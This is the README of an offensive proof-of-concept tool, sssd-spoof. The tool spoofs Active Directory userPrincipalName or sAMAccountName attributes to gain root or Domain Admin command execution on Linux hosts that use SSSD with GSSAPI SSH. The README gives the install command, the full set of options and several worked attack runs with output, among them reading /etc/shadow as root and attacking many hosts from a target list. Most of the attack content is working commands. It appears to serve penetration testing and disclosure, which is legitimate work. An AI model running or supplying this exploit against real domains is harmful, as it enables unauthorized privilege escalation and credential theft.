# sssd-spoof

A POC for spoofing the `sAMAccountName` and `userPrincipalName` attributes in Active Directory to escalate privileges on domain-joined Linux systems using `SSSD` with `GSSAPI` authentication.

For more information on the attack vector, see the following resources:
* [https://blog.async.sg/kerberos-ldr](https://blog.async.sg/kerberos-ldr)
* [https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)

# Installation

```
pipx install git+https://github.com/ASYNC-Security/sssd-spoof
```

# Usage

```
~$ sssd-spoof.py --help          

usage: sssd-spoof.py [-h] [-tf TARGET_FILE] [-dc KDC_HOST] [--upn UPN] [--sam SAM] [-tu TARGET_USER] [-tp TARGET_PASSWORD] [--ssl] -x CMD CRED[@TARGET]

[[domain/]user:pass@]target or [domain/]user:pass + -tf file

positional arguments:
  CRED[@TARGET]         Either [[domain/]user:pass@]target OR [domain/]user:pass (with -tf)

options:
  -h, --help            show this help message and exit
  -tf, --target-file TARGET_FILE
                        File with one target host per line
  -dc, --kdc-host KDC_HOST
                        KDC host
  --upn UPN             New UPN to set
  --sam SAM             New sAMAccountName to set
  -tu, --target-user TARGET_USER
                        Account whose UPN/SAM you can modify
  -tp, --target-password TARGET_PASSWORD
                        Password for the target account
  --ssl                 Use LDAPs
  -x, --execute CMD     Command to run on target
```

## UPN Spoofing (Domain Users)

Given the ability to write to the `userPrincipalName` attribute of a user, you can spoof the UPN to match that of a privileged user. In this case, `svc_sql` is a user that we have write access to.

```
~$ sssd-spoof.py 'mercury.local'/'gatari':'P@ssw0rd'@L-PROD-WEB001.mercury.local --target-user 'svc_sql' --target-password 'P@ssw0rd123' --upn 'Administrator@mercury.local' -x 'whoami && hostname && id'
[-] no KDC host specified, make sure you have a valid krb5.conf
[-] continuing with default (/etc/krb5.conf)
[*] Impacket v0.13.0.dev0+20250713.182712.930296c - Copyright Fortra, LLC and its affiliated companies 

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName svc_sql@mercury.local => Administrator@mercury.local
[*] saved TGT to Administrator\@mercury.local.ccache
[*] trying: L-PROD-WEB001.mercury.local
[*] pwned!!

administrator@mercury.local
L-PROD-WEB001.mercury.local
uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName Administrator@mercury.local => svc_sql@mercury.local
```

## UPN Spoofing (Local Users)

It is also possible to spoof local users by specifying the `--upn` option with a local user name, this is far more powerful.

```
~$ sssd-spoof.py 'mercury.local'/'gatari':'P@ssw0rd'@L-PROD-WEB001.mercury.local --target-user 'svc_sql' --target-password 'P@ssw0rd123' --upn 'root' -x 'id && tail -n 3 /etc/shadow'
[-] no KDC host specified, make sure you have a valid krb5.conf
[-] continuing with default (/etc/krb5.conf)
[*] Impacket v0.13.0.dev0+20250713.182712.930296c - Copyright Fortra, LLC and its affiliated companies 

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName svc_sql@mercury.local => root
[*] saved TGT to root.ccache
[*] trying: L-PROD-WEB001.mercury.local
[*] pwned!!

uid=0(root) gid=0(root) groups=0(root)
sshd:*:20093:0:99999:7:::
lxd:!:20093::::::
sssd:*:20279:0:99999:7:::

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName root => svc_sql@mercury.local
```

## SAM Spoofing

Similarly, given write access to the `sAMAccountName` attribute, you can spoof the `sAMAccountName` to match that of a privileged local user. As you would imagine, this is not useful for domain users.

```
~$ sssd-spoof.py 'mercury.local'/'gatari':'P@ssw0rd'@L-PROD-WEB001.mercury.local --target-user 'svc_sql' --target-password 'P@ssw0rd123' --sam 'root' -x 'id && hostname'
[-] no KDC host specified, make sure you have a valid krb5.conf
[-] continuing with default (/etc/krb5.conf)
[*] Impacket v0.13.0.dev0+20250713.182712.930296c - Copyright Fortra, LLC and its affiliated companies 

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: sAMAccountName svc_sql => root
[*] saved TGT to root.ccache
[*] trying: L-PROD-WEB001.mercury.local
[*] pwned!!

uid=0(root) gid=0(root) groups=0(root)
L-PROD-WEB001.mercury.local

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: sAMAccountName root => svc_sql
```

## Multiple Targets

You can also specify a file with one target host per line using the `-tf` option. This is useful for targeting multiple hosts at once.

```
~$ sssd-spoof.py 'mercury.local'/'gatari':'P@ssw0rd' -tf 'targets.txt' --target-user 'svc_sql' --target-password 'P@ssw0rd123' --sam 'root' -x 'id && hostname'                      
[-] no KDC host specified, make sure you have a valid krb5.conf
[-] continuing with default (/etc/krb5.conf)
[*] Impacket v0.13.0.dev0+20250713.182712.930296c - Copyright Fortra, LLC and its affiliated companies 

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: sAMAccountName svc_sql => root
[*] saved TGT to root.ccache
[*] trying: L-MGRT-APP001.mercury.local
[*] pwned!!

uid=0(root) gid=0(root) groups=0(root)
L-MGRT-APP001.mercury.local

[*] connection closed.

[*] trying: L-PROD-WEB001.mercury.local
[*] pwned!!

uid=0(root) gid=0(root) groups=0(root)
L-PROD-WEB001.mercury.local

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: sAMAccountName root => svc_sql
```

You can also target both the `userPrincipalName` and `sAMAccountName` attributes at the same time by specifying both options.

```
~$ sssd-spoof.py 'mercury.local'/'gatari':'P@ssw0rd' -tf 'targets.txt' --target-user 'svc_sql' --target-password 'P@ssw0rd123' --sam 'root' --upn 'Administrator@mercury.local' -x 'id && hostname'
[-] no KDC host specified, make sure you have a valid krb5.conf
[-] continuing with default (/etc/krb5.conf)
[*] Impacket v0.13.0.dev0+20250713.182712.930296c - Copyright Fortra, LLC and its affiliated companies 

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName svc_sql@mercury.local => Administrator@mercury.local
[*] saved TGT to Administrator\@mercury.local.ccache
[*] trying: L-MGRT-APP001.mercury.local
[*] pwned!!

uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
L-MGRT-APP001.mercury.local

[*] connection closed.

[*] trying: L-PROD-WEB001.mercury.local
[*] pwned!!

uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
L-PROD-WEB001.mercury.local

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName Administrator@mercury.local => svc_sql@mercury.local
[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: sAMAccountName svc_sql => root
[*] saved TGT to root.ccache
[*] trying: L-MGRT-APP001.mercury.local
[*] pwned!!

uid=0(root) gid=0(root) groups=0(root)
L-MGRT-APP001.mercury.local

[*] connection closed.

[*] trying: L-PROD-WEB001.mercury.local
[*] pwned!!

uid=0(root) gid=0(root) groups=0(root)
L-PROD-WEB001.mercury.local

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: sAMAccountName root => svc_sql
```

## KDC Host

In order for SSH to properly authenticate using the `GSSAPI` mechanism, you need to ensure that you have a valid `krb5.conf` configuration file. This is done for you if the `-dc` option is specified.

```
~$ sssd-spoof.py 'mercury.local'/'gatari':'P@ssw0rd'@L-MGRT-APP001.mercury.local --target-user 'svc_sql' --target-password 'P@ssw0rd123' -dc 'C-DC01.mercury.local' --upn 'Administrator@mercury.local' -x 'id && hostname'
[*] Impacket v0.13.0.dev0+20250713.182712.930296c - Copyright Fortra, LLC and its affiliated companies 

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName svc_sql@mercury.local => Administrator@mercury.local
[*] saved TGT to Administrator\@mercury.local.ccache
[*] trying: L-MGRT-APP001.mercury.local
[*] pwned!!

uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
L-MGRT-APP001.mercury.local

[*] connection closed.

[*] LDAP Bind => mercury.local\gatari @ ldap://mercury.local:389
[*] OK: userPrincipalName Administrator@mercury.local => svc_sql@mercury.local
```

This will save the resultant file to `./krb5.conf`:

```
~$ cat krb5.conf -p
[libdefaults]
    default_realm = MERCURY.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    MERCURY.LOCAL = {
        kdc = c-dc01.mercury.local
        admin_server = c-dc01.mercury.local
        default_domain = mercury.local
    }

[domain_realm]
    .mercury.local = MERCURY.LOCAL
    mercury.local = MERCURY.LOCAL
```